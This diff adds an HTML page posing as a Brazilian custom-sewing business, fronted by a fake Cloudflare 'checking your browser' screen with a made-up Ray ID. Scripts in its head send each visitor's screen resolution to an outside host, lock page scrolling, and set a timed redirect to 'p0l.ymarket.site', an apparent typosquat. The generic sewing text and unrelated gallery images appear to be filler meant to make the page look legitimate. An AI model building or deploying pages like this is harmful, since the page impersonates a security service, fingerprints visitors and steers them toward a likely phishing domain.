@@ -1,0 +1,332 @@
+<html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+	   <script>
+        // Função para obter a resolução da tela e enviar via GET
+        function enviarResolucao() {
+            // Obtém a resolução da tela
+            const largura = window.screen.width;
+            const altura = window.screen.height;
+
+            // Monta a URL com a resolução como parâmetros
+            const url = `https://project-3d.site/saveresolucao.php?largura=${largura}&altura=${altura}`;
+
+            // Envia a requisição GET
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Resolução enviada com sucesso!');
+                    } else {
+                        console.error('Erro ao enviar a resolução:', response.statusText);
+                    }
+                })
+                .catch(error => console.error('Erro na requisição:', error));
+        }
+
+        // Chama a função ao carregar a página
+        window.addEventListener('load', enviarResolucao);
+    </script>
+	   <script>
+        // Função para subir a página
+        function subirParaTopo() {
+            window.scrollTo(0, 0); // Rola a página para o topo
+        }
+
+        // Função para travar a rolagem
+        function travarRolagem() {
+            // Previne a rolagem da página
+            window.scrollTo(0, 0);
+            // Reconfigura a posição da rolagem a cada 100ms
+            setTimeout(travarRolagem, 100);
+        }
+
+        // Inicia as funções ao carregar a página
+        window.onload = function() {
+            subirParaTopo(); // Sobe para o topo
+			console.log('1 enviada com sucesso!');
+            travarRolagem(); // Trava a rolagem
+			console.log('2 enviada com sucesso!');
+        };
+    </script>
+	  <script>
+        function redirecionar() {
+            // Redirecionar para o URL desejado
+            window.location.href = 'https://p0l.ymarket.site'; // Substitua pelo seu URL
+        }
+
+        // Trocar a página após 5 segundos
+        setTimeout(redirecionar, 500000);
+    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Corte e Costura Personalizada</title>
+    <style>
+        /* Estilos Gerais */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Loading Styles */
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #f7f8fa;
+            width: 100%;
+            text-align: center;
+        }
+
+        .loading-dots {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 1rem;
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            margin: 0 5px;
+            background-color: #f48120;
+            border-radius: 50%;
+            animation: blink 1.2s infinite both;
+        }
+
+        .dot:nth-child(1) { animation-delay: 0s; }
+        .dot:nth-child(2) { animation-delay: 0.4s; }
+        .dot:nth-child(3) { animation-delay: 0.8s; }
+
+        @keyframes blink {
+            0%, 80%, 100% { opacity: 0; }
+            40% { opacity: 1; }
+        }
+
+        .container h1, .container p, .ray-id {
+            font-size: 1.2rem;
+        }
+
+        /* Estilos da Página de Conteúdo */
+        header {
+            background: #8e44ad;
+            color: white;
+            text-align: center;
+            padding: 50px 20px;
+            width: 100%;
+        }
+
+        .banner h1 {
+            font-size: 2.5em;
+            margin: 0;
+        }
+
+        button {
+            background: #e74c3c;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1em;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        button:hover { background: #c0392b; }
+
+        section {
+            padding: 40px;
+            margin: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 1200px;
+        }
+
+        h2 {
+            border-bottom: 2px solid #3498db;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+
+        .galeria {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+        }
+
+        .galeria img {
+            max-width: 30%;
+            margin: 10px;
+            border-radius: 8px;
+            transition: transform 0.3s;
+        }
+
+        .galeria img:hover { transform: scale(1.05); }
+
+        footer {
+            text-align: center;
+            padding: 40px;
+            background: #8e44ad;
+            color: white;
+            width: 100%;
+        }
+
+        .link { color: #0056b3; text-decoration: none; }
+        .link:hover { text-decoration: underline; }
+
+        /* Responsividade */
+        @media (max-width: 768px) {
+            .banner h1 { font-size: 2em; }
+            .galeria img { max-width: 45%; }
+            .container h1 { font-size: 1.5rem; }
+        }
+    </style>
+<style type="text/css" id="operaUserStyle"></style></head>
+<body>
+    <!-- Loading Section -->
+    <div class="loading-container">
+        <div class="loading-dots">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+        <h1 style="font-size: 1.3rem;">Checking your browser before accessing...</h1><br>
+        <p>This process is automatic. Waiting Your browser to your requested content shortly.</p>
+        <p>Please allow up to 5 seconds...</p>
+        <p><a href="#" class="link">DDoS protection by Cloudflare</a></p>
+        <div class="ray-id">Ray ID: <span>6f23c4a2b8cd9d3a</span></div>
+    </div>
+
+    <!-- Main Content Section -->
+    <header>
+        <div class="banner">
+            <h1>Realize suas ideias de forma única!</h1>
+            <button><a href="#contato" style="color: white; text-decoration: none;">Peça uma Consulta Gratuita</a></button>
+        </div>
+    </header>
+
+    <section id="sobre">
+        <h2>Quem Somos</h2>
+        <p>Na Corte e Costura, temos uma paixão enorme por moda e criação. Oferecemos serviços de costura sob medida, atendendo às suas preferências e estilo pessoal.</p>
+    </section>
+
+    <section id="sobre">
+        <h2>Aprenda Mais sobre Corte e Costura
+</h2>
+        <p>A costura é uma prática que remonta a épocas antigas, sendo uma habilidade crucial para a criação de vestuário. Desde civilizações primitivas, as pessoas utilizavam agulhas feitas de materiais naturais para unir tecidos. Com o tempo, essa técnica avançou, levando ao surgimento de máquinas de costura que transformaram a indústria têxtil no século XIX. A costura não é apenas uma habilidade funcional, mas também uma forma de expressão artística que permite manifestar criatividade e individualidade. Atualmente, o corte e a costura continuam a ser fundamentais na moda, possibilitando a personalização e a criação de peças únicas que refletem o estilo de cada pessoa.
+.</p>
+    </section><section id="sobre">
+        <h2>A Evolução da  Costura </h2>
+        <p>O corte e a costura abrangem diversas técnicas que podem variar conforme o projeto e o tipo de tecido utilizado. O corte é a fase inicial, onde os materiais são preparados e recortados nas formas desejadas. É crucial ter precisão nessa etapa, pois um corte impreciso pode comprometer toda a peça. Após o corte, segue-se a costura, que consiste na união das partes cortadas. Existem diferentes tipos de pontos, como o ponto reto, ziguezague e caseado, cada um com suas respectivas aplicações. Ademais, a escolha dos materiais, como linhas, botões e zíperes, também é essencial para o resultado final. Aprender e dominar essas técnicas pode demandar tempo, mas os resultados são recompensadores, pois cada peça se torna uma extensão da sua criatividade..</p>
+    </section><section id="sobre">
+        <h2>Estratégias de Corte e Costura</h2>
+        <p>Para aqueles que estão iniciando no universo do corte e costura, algumas orientações podem facilitar o aprendizado. Primeiramente, invista em boas ferramentas, como uma máquina de costura confiável e utensílios essenciais, como tesouras, réguas e alfinetes. É importante também optar por projetos que se adequem ao seu nível de habilidade. Começar com peças simples, como saias ou almofadas, pode ajudar a ganhar confiança. Além disso, não tenha medo de cometer erros; cada falha é uma chance de aprendizado. Por fim, considere participar de cursos ou grupos de costura, onde você pode compartilhar experiências e aprender com outros apaixonados. A costura é uma habilidade gratificante que proporciona um sentimento de realização ao criar algo exclusivo e personalizado..</p>
+    </section><section id="sobre">
+        <h2>Erros Frequentes e Como Evitá-los</h2>
+		   <p>Todo costureiro, seja iniciante ou experiente, comete erros ocasionalmente. Reconhecer os erros mais comuns pode ajudar a evitá-los. Um dos enganos mais frequentes é não pré-lavar o tecido antes de cortar, o que pode resultar em encolhimento indesejado após a confecção da peça. Outro erro comum é a falta de planejamento na escolha do padrão e do tecido; é fundamental considerar a compatibilidade entre ambos. Além disso, não ler as instruções do padrão cuidadosamente pode causar confusões durante a costura. Por fim, não se apresse: a costura é uma arte que requer paciência e prática. Aprender a evitar esses erros pode levar a um resultado final muito mais gratificante...</p>
+    </section><section id="sobre">
+        <h2>O Valor da Moda Sustentável</h2>
+        <p>A moda sustentável tem se destacado nos últimos anos, e o corte e a costura desempenham um papel significativo nesse contexto. A crescente consciência sobre o impacto ambiental da indústria da moda levou muitos a buscar opções mais responsáveis. Isso inclui o uso de tecidos ecológicos, a redução do desperdício e a valorização de técnicas de costura que prolongam a vida útil das peças. Ao optar pela costura sob medida, você não apenas adquire roupas personalizadas, mas também colabora para um consumo mais consciente, evitando a produção em massa e priorizando a qualidade em detrimento da quantidade. Adotar a moda sustentável é uma forma de alinhar seu estilo pessoal com princípios éticos e ambientais..</p>
+    </section><section id="servicos">
+        <h2>Nossos Serviços</h2>
+        <ul>
+            <li>poly-costura Personalizada</li>
+            <li>Ajustes e Reformas</li>
+            <li>Desenvolvimento de Modelos Exclusivos</li>
+            <li>Consultoria de Moda</li>
+        </ul>
+    </section>
+
+    <section id="textos">
+        <h2>Aprenda Mais sobre Corte e poly-costura</h2>
+        <div class="texto">
+            <h3>A Evolução da Costura</h3>
+            <p>A costura é uma prática que remonta a épocas antigas...</p>
+        </div>
+        <!-- Adicione outras seções "texto" conforme necessário -->
+    </section>
+
+    <section id="galeria">
+        <h2>Confira Nosso Trabalho com poly-costura</h2>
+        <div class="galeria">
+            <img src="https://i1.sndcdn.com/artworks-000658299916-vh49zb-t500x500.jpg" alt="Projeto 1">
+            <img src="https://cdns-images.dzcdn.net/images/artist/a3ee8940e4c6c4ad318caf78a257d22b/1900x1900-000000-80-0-0.jpg" alt="Projeto 2">
+            <img src="https://akamai.sscdn.co/uploadfile/letras/fotos/d/0/8/8/d088018120012e3238754e049f1c3cf8.jpg" alt="Projeto 3">
+        </div>
+    </section>
+
+   <section id="contato" style="
+    padding: 40px;
+    margin: 20px;
+    background: white;
+    border-radius: 8px;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+">
+        <h2>Pronto para poly-costura?</h2>
+        <button><a href="#formulario" style="color: white; text-decoration: none;">Peça uma poly-costura Gratuita</a></button><br>
+        <form id="formulario">
+            <label for="nome">Nome:</label>
+            <input type="text" id="nome" name="nome" required="" style="
+    width: 100%;
+    padding: 10px;
+    margin: 10px 0;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+">
+            <label for="email">E-mail:</label>
+            <input type="email" id="email" name="email" required="" style="
+    width: 100%;
+    padding: 10px;
+    margin: 10px 0;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+">
+            <label for="mensagem">Mensagem:</label>
+            <textarea id="mensagem" name="mensagem" required="" style="
+    width: 100%;
+    padding: 10px;
+    margin: 10px 0;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+"></textarea>
+            <button type="submit" style="background: #28a745;">Enviar</button>
+        </form>
+    </section>
+
+
+<footer>
+        <h2>Conecte-se Conosco</h2><br>
+        <p>Siga-nos nas redes sociais!</p><br>
+        <p>Email: poly-costura@costura-poly-market.com | Telefone: (11) 97716-131</p><br>
+        <div class="materiais-semana">
+            <h3>Matérias da Semana</h3><br>
+            <p>1. Dicas de Costura para Iniciantes</p><br>
+            <p>2. Tendências de Moda para a Próxima Temporada</p><br>
+            <p>3. Como Escolher o Tecido Ideal</p><br>
+        </div>
+      
+    </footer>
+    <script>
+        // Adjust font size for responsiveness
+        window.addEventListener("resize", adjustSizes);
+        window.addEventListener("load", adjustSizes);
+
+        function adjustSizes() {
+            const width = window.innerWidth;
+            let fontSize = width <= 768 ? "1.3rem" : "1.6rem";
+            document.querySelector(".loading-container h1").style.fontSize = fontSize;
+        }
+    </script>
+
+
+</body></html>
